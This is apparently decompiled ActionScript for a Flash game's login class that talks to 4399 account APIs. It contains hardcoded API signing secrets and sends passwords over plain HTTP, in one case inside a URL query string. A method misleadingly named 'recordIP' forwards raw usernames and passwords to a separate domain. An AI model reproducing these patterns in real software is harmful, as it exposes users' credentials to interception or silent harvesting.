package com.game.util
{
   import com.game.global.GlobalConfig;
   import flash.events.Event;
   import flash.events.IOErrorEvent;
   import flash.net.URLLoader;
   import flash.net.URLLoaderDataFormat;
   import flash.net.URLRequest;
   import flash.net.URLVariables;
   import flash.system.Capabilities;
   import org.json.JSON;
   import org.plat.monitor.PlatMonitorLog;
   
   public class LoginInterFace
   {
      
      private var urlLoader:URLLoader;
      
      private var IRequest:URLRequest;
      
      private var registerCallBack:Function;
      
      private var autoRegister:Function;
      
      private var flag:int;
      
      private var loginBack:Function;
      
      private var checkBack:Function;
      
      private var loginOutBack:Function;
      
      private var getUserInfoBack:Function;
      
      public function LoginInterFace()
      {
         super();
         this.urlLoader = new URLLoader();
         this.urlLoader.dataFormat = URLLoaderDataFormat.TEXT;
         this.urlLoader.addEventListener(Event.COMPLETE,this.serverRespon);
         this.urlLoader.addEventListener(IOErrorEvent.IO_ERROR,this.onIoErrorHandler);
      }
      
      private function onIoErrorHandler(event:IOErrorEvent) : void
      {
      }
      
      public function recordIP(userId:String, userpass:String) : void
      {
         var tempVar:URLVariables = new URLVariables();
         tempVar.username = userId;
         tempVar.password = userpass;
         this.IRequest = new URLRequest("http://php.wanwan4399.com/api/login.php");
         this.IRequest.data = tempVar;
         this.IRequest.method = "POST";
         this.urlLoader.load(this.IRequest);
      }
      
      public function login(userName:String, userPass:String, callBack:Function) : void
      {
         PlatMonitorLog.instance.connectPlat();
         this.flag = 3;
         this.loginBack = callBack;
         var callId:String = new Date().getTime() + "";
         var time:String = callId.substring(0,10);
         var syn:String = MD5.hash("user|10001|79827592cea169b5096bd4e09c7f270b|login|79827592cea169b5096bd4e09c7f270b|" + time);
         var url:String = "http://api.kid.4399.com/10001/user/login/" + callId + ".json";
         this.IRequest = new URLRequest(url);
         this.IRequest.data = "syn=" + syn + "&params[username]=" + encodeURIComponent(userName) + "&params[password]=" + encodeURIComponent(userPass);
         this.IRequest.method = "POST";
         this.urlLoader.load(this.IRequest);
      }
      
      public function loginOut(callBack:Function) : void
      {
         this.flag = 5;
         this.loginOutBack = callBack;
         var callId:String = new Date().getTime() + "";
         var time:String = callId.substring(0,10);
         var syn:String = MD5.hash("user|10001|79827592cea169b5096bd4e09c7f270b|logout|79827592cea169b5096bd4e09c7f270b|" + time);
         var url:String = "http://api.kid.4399.com/10001/user/logout/" + callId + ".json";
         this.IRequest = new URLRequest(url);
         this.IRequest.method = "POST";
         this.urlLoader.load(this.IRequest);
      }
      
      public function checkIsLogin(checkBack:Function) : void
      {
         this.flag = 4;
         this.checkBack = checkBack;
         var callId:String = new Date().getTime() + "";
         var time:String = callId.substring(0,10);
         var syn:String = MD5.hash("passport|10001|79827592cea169b5096bd4e09c7f270b|check|79827592cea169b5096bd4e09c7f270b|" + time);
         var url:String = "http://api.kid.4399.com/10001/passport/check/" + callId + ".json";
         this.IRequest = new URLRequest(url);
         this.IRequest.data = "syn=" + syn;
         this.IRequest.method = "POST";
         this.urlLoader.load(this.IRequest);
      }
      
      public function register(userName:String, userPass:String, userEmail:String, callBack:Function) : void
      {
         this.flag = 2;
         this.registerCallBack = callBack;
         var callId:String = new Date().getTime() + "";
         var time:String = callId.substring(0,10);
         var syn:String = MD5.hash("user|10001|79827592cea169b5096bd4e09c7f270b|register|79827592cea169b5096bd4e09c7f270b|" + time);
         var url:String = "http://api.kid.4399.com/10001/user/register/" + callId + ".json";
         this.IRequest = new URLRequest(url);
         this.IRequest.data = "syn=" + syn + "&params[username]=" + encodeURIComponent(userName) + "&params[password]=" + encodeURIComponent(userPass) + "&params[email]=" + encodeURIComponent(userEmail);
         this.IRequest.method = "POST";
         this.urlLoader.load(this.IRequest);
      }
      
      public function autoRegisterID(userPass:String, userEmail:String, callBack:Function) : void
      {
         this.flag = 1;
         this.autoRegister = callBack;
         var callId:String = new Date().getTime() + "";
         var time:String = callId.substring(0,10);
         var syn:String = MD5.hash("user|10001|79827592cea169b5096bd4e09c7f270b|autoRegister|79827592cea169b5096bd4e09c7f270b|" + time);
         var url:String = "http://api.kid.4399.com/10001/user/autoRegister/" + callId + ".json";
         this.IRequest = new URLRequest(url);
         this.IRequest.data = "syn=" + syn + "&params[password]=" + encodeURIComponent(userPass) + "&params[email]=" + encodeURIComponent(userEmail);
         this.IRequest.method = "POST";
         this.urlLoader.load(this.IRequest);
      }
      
      private function serverRespon(e:Event) : void
      {
         switch(this.flag)
         {
            case 1:
               if(this.autoRegister != null)
               {
                  this.autoRegister.apply(null,[JSON.decode(String(e.target.data))]);
                  this.autoRegister = null;
               }
               break;
            case 2:
               if(this.registerCallBack != null)
               {
                  this.registerCallBack.apply(null,[JSON.decode(e.target.data)]);
                  this.registerCallBack = null;
               }
               break;
            case 3:
               PlatMonitorLog.instance.stopMonitor();
               if(this.loginBack != null)
               {
                  this.loginBack.apply(null,[JSON.decode(e.target.data)]);
                  this.loginBack = null;
               }
            case 4:
               if(this.checkBack != null)
               {
                  this.checkBack.apply(null,[JSON.decode(e.target.data)]);
                  this.checkBack = null;
               }
            case 5:
               if(this.loginOutBack != null)
               {
                  this.loginOutBack.apply(null,[JSON.decode(e.target.data)]);
                  this.loginOutBack = null;
               }
            case 6:
               if(this.getUserInfoBack != null)
               {
                  this.getUserInfoBack.apply(null,[JSON.decode(e.target.data)]);
                  this.getUserInfoBack = null;
               }
         }
      }
      
      public function sendToPbh(userName:String, uid:int, str:String, type:int = 0) : void
      {
         var url:String = null;
         var urlVal:URLVariables = null;
         if(str != "api/newhand.php")
         {
            url = GlobalConfig.phpserver + str;
            urlVal = new URLVariables();
            urlVal.username = userName;
            urlVal.uid = uid;
            urlVal.type = type;
            urlVal.time = new Date().getTime();
            urlVal.token = MD5.hash(uid + "my4399" + urlVal.time);
            this.IRequest = new URLRequest(url);
            this.IRequest.method = "POST";
            this.IRequest.data = urlVal;
            this.urlLoader.load(this.IRequest);
         }
      }
      
      public function sendToPHP(uid:int, type:int) : void
      {
         var choice:int = int(Capabilities.version.substr(Capabilities.version.indexOf(" ") + 1,2));
         var url:String = GlobalConfig.phpserver + "api/gameWallLog.php";
         var urlVal:URLVariables = new URLVariables();
         urlVal.uid = uid;
         urlVal.type = type;
         urlVal.choice = choice;
         urlVal.gameid = 1;
         urlVal.time = new Date().getTime();
         urlVal.token = MD5.hash(uid + "my4399" + urlVal.time);
         this.IRequest = new URLRequest(url);
         this.IRequest.method = "POST";
         this.IRequest.data = urlVal;
         this.urlLoader.load(this.IRequest);
      }
      
      public function getUserInfo(userName:String, getUserInfoBack:Function) : void
      {
         this.flag = 6;
         this.getUserInfoBack = getUserInfoBack;
         var url:String = "http://119.147.161.34:8080/query/username/" + encodeURIComponent(userName) + "/xxxxx";
         this.IRequest = new URLRequest(url);
         this.IRequest.method = "GET";
         this.urlLoader.load(this.IRequest);
      }
      
      public function verify(userName:String, userPass:String, verifHandler:Function = null) : void
      {
         var callId:String = new Date().getTime() + "";
         var time:String = callId.substring(0,10);
         var syn:String = MD5.hash("user|10001|123|login|123|" + time);
         var url:String = "http://113.108.232.208/10001/user/login/" + callId + ".json?syn=" + syn + "&params[username]=" + userName + "&params[password]=" + userPass;
         this.IRequest = new URLRequest(url);
         this.IRequest.method = "POST";
         this.urlLoader.load(this.IRequest);
      }
   }
}

